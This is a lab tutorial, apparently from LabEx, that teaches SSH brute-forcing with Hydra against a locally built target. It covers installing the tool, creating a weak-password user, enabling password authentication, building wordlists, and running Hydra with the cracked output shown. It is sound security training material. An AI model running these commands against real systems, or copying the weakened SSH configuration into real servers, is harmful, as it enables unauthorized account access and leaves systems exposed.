# Install Hydra

In this step, we will install Hydra, a powerful password-cracking tool used for brute-force attacks against various network services. Hydra is particularly useful for penetration testing as it can systematically try different username and password combinations to gain access to secured systems. It supports multiple protocols including SSH (which we'll use in this lab), FTP, HTTP, and more.

1. First, open the terminal in your LabEx VM environment. The terminal is your primary interface for running commands in Linux. Ensure you're in the default working directory where we'll perform all our lab work:
    
    ```bash
    cd ~/project
    ```
    
2. Before installing any new software, it's good practice to update your package list. This ensures you'll get the latest available version of Hydra and all its dependencies:
    
    ```bash
    sudo apt update
    ```
    
3. Now we'll install Hydra using the apt package manager, which handles software installation on Debian-based systems like Ubuntu. The `-y` flag automatically confirms the installation:
    
    ```bash
    sudo apt install -y hydra
    ```
    
4. After installation, let's verify Hydra is properly installed by checking its version. The `head -n 1` command shows just the first line of output, which contains the version information:
    
    ```bash
    hydra -h | head -n 1
    ```
    
    ![Output showing Hydra version](https://file.labex.io/namespace/df87b950-1f37-4316-bc07-6537a1f2c481/cybersecurity/lab-brute-force-ssh-in-hydra/assets/20250429-11-14-51-bU7gf0qS.png)
    
    You should see output similar to:
    
    ```
    Hydra v9.2 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
    ```
    
5. Hydra also offers a graphical interface version for those who prefer GUI tools. While we'll be using the command-line version in this lab, you can optionally install the GTK+ GUI version with:
    
    ```bash
    sudo apt install -y hydra-gtk
    ```
    
    ![Output showing Hydra version](https://file.labex.io/namespace/df87b950-1f37-4316-bc07-6537a1f2c481/cybersecurity/lab-brute-force-ssh-in-hydra/assets/20250429-11-13-47-Ra4Av9MF.png)
# Set Up a Target SSH Server

In this step, we will configure a local SSH server that will serve as our target for password cracking in subsequent steps. This allows us to practice penetration testing techniques in a controlled environment. SSH (Secure Shell) is a protocol used for secure remote login between computers, and we'll be setting up a vulnerable version for learning purposes.

1. First, ensure you're in the default working directory. This is important because we want all our lab files to be organized in one place:
    
    ```bash
    cd ~/project
    ```
    
2. Install the OpenSSH server package. This software will turn your machine into an SSH server that can accept remote connections:
    
    ```bash
    sudo apt install -y openssh-server
    ```
    
3. Create a dedicated test user account with a weak password (for demonstration purposes only). In real-world scenarios, weak passwords like this are exactly what attackers look for:
    
    ```bash
    sudo useradd -m testuser
    echo "testuser:password123" | sudo chpasswd
    ```
    
4. Configure SSH to allow password authentication (temporarily for this lab). By default, many systems disable password authentication for security reasons, but we're enabling it here to demonstrate how brute force attacks work:
    
    ```bash
    sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
    ```
    
5. Restart the SSH service to apply changes. Services often need to be restarted after configuration changes take effect:
    
    ```bash
    sudo service ssh restart
    ```
    
6. Verify the SSH server is running. This command checks if our SSH server is properly active and listening for connections:
    
    ```bash
    sudo service ssh status
    ```
    
    You should see output indicating the service is active (running). If not, there may have been an error in previous steps that needs troubleshooting.
    
7. Test the SSH connection locally. This final check confirms everything is working before we proceed to the attack phase:
    
    ```bash
    ssh testuser@localhost -o StrictHostKeyChecking=no
    ```
    
    When prompted, enter the password `password123`. After successful login, type `exit` to return to your main session. The `-o StrictHostKeyChecking=no` option prevents SSH from asking you to verify the server's fingerprint, which is acceptable for this lab environment.
    
    ![Local SSH connection test result](https://file.labex.io/namespace/df87b950-1f37-4316-bc07-6537a1f2c481/cybersecurity/lab-brute-force-ssh-in-hydra/assets/20250429-11-15-45-TTgJFCkQ.png)

```
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
```
This command modifies the SSH server configuration to enable password authentication. Here's a breakdown:

- `sudo`: Runs the command with superuser privileges, necessary for modifying system files.
- `sed`: A stream editor used for parsing and transforming text.
- `-i`: Edits the file in place.
- `'s/PasswordAuthentication no/PasswordAuthentication yes/'`: This is the substitution command. It searches for the line containing `PasswordAuthentication no` and replaces it with `PasswordAuthentication yes`.
- `/etc/ssh/sshd_config`: The path to the SSH server configuration file.

# Prepare a Username and Password List

In this step, we will create text files containing potential usernames and passwords that Hydra will use to attempt SSH authentication. These files are essential for dictionary-based brute-force attacks. A dictionary attack works by systematically trying all possible combinations of usernames and passwords from predefined lists, which is why preparing good lists is crucial.

1. First, ensure you're in the default working directory. This helps keep your project files organized and makes it easier to reference them later:
    
    ```bash
    cd ~/project
    ```
    
2. Create a username list file using the nano text editor. Common usernames are often tried first in brute-force attacks because many systems use default or predictable usernames:
    
    ```bash
    nano usernames.txt
    ```
    
    Add these common usernames (press Ctrl+O to save, then Ctrl+X to exit):
    
    ```
    admin
    root
    testuser
    user
    guest
    ```
    
3. Create a password list file. Weak passwords like these are frequently used and are often the first targets in security testing:
    
    ```bash
    nano passwords.txt
    ```
    
    Add these common passwords:
    
    ```
    password
    password123
    123456
    qwerty
    letmein
    ```
    
4. Verify the files were created correctly by displaying their contents. This confirmation step ensures there are no typos or formatting issues in your lists:
    
    ```bash
    cat usernames.txt
    cat passwords.txt
    ```
    
    You should see the lists you created displayed in the terminal.
    
5. (Optional) Generate additional password variations using crunch. This tool helps create more comprehensive password lists by automatically generating combinations based on specified patterns:
    
    ```bash
    sudo apt install -y crunch
    crunch 4 6 0123456789 -o num_passwords.txt
    ```
    
    This creates numeric passwords between 4-6 characters length. The command specifies minimum length (4), maximum length (6), and the character set (digits 0-9).

# Run Hydra Against SSH

In this step, we will use Hydra to perform a brute-force attack against our local SSH server. Brute-forcing is a method of trying many username/password combinations until finding the correct one. We'll use the wordlists we prepared earlier to automate this process.

1. First, navigate to the project directory containing your wordlists. This ensures Hydra can find the files we created:
    
    ```bash
    cd ~/project
    ```
    
2. Now we'll execute Hydra with specific parameters. The command structure tells Hydra what to attack and how. Let's break it down:
    
    ```bash
    hydra -L usernames.txt -P passwords.txt ssh://localhost -t 4 -vV
    ```
    
    Explanation of parameters:
    
    - `-L usernames.txt`: Points to our list of possible usernames
    - `-P passwords.txt`: Specifies our password dictionary file
    - `ssh://localhost`: Targets the SSH service on this machine
    - `-t 4`: Controls speed by limiting to 4 simultaneous attempts
    - `-vV`: Shows detailed progress in the terminal
3. As Hydra runs, it will display each attempt in real-time. When it finds valid credentials, they'll appear clearly in the output like this:
    
    ```
    [22][ssh] host: localhost   login: testuser   password: password123
    ```
    
    ![Hydra run results display](https://file.labex.io/namespace/df87b950-1f37-4316-bc07-6537a1f2c481/cybersecurity/lab-brute-force-ssh-in-hydra/assets/20250429-11-17-30-48841Kui.png)
    
4. (Optional) To keep a permanent record of the results, we can save them to a file. This is useful for documentation or further analysis:
    
    ```bash
    hydra -L usernames.txt -P passwords.txt ssh://localhost -t 4 -o results.txt
    ```
    
5. After the scan completes, you can view the saved results with:
    
    ```bash
    cat results.txt
    ```